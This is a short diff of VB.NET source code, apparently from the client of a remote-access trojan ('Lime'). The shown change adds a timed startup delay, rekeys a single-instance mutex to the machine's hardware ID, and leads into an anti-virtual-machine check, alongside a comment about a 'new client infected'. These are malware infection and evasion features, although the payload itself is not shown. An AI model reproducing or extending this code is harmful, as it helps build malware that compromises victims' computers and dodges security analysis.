@@ -38,6 +38,7 @@ Namespace Lime
         Public Shared C As New C_Socket
         Public Shared SPL = C_Settings.SPL
 
+
         Public Shared Sub Main()
 
             Try
@@ -46,21 +47,18 @@ Namespace Lime
                 'Thread.Sleep(35000) '[New client infected]
                 'End If
 
+
                 Dim num As Integer = C_Settings.Delay
                 Do Until num = 0
                     Threading.Thread.Sleep(1000)
                     num -= 1
                 Loop
 
-                Dim createdNew As Boolean
-                Dim mutex As Threading.Mutex = New Threading.Mutex(True, C_Settings.MTX, createdNew)
-                Try
-                    If Not createdNew Then End
-                Finally
-                    If createdNew Then
-                        mutex.ReleaseMutex()
-                    End If
-                End Try
+                Dim createdNew As Boolean = False
+                C_Settings.MTX = New Threading.Mutex(True, C_ID.HWID, createdNew)
+                If Not createdNew Then
+                    End
+                End If
 
                 If C_Settings.ANTI Then
                     C_AntiVM.Check()
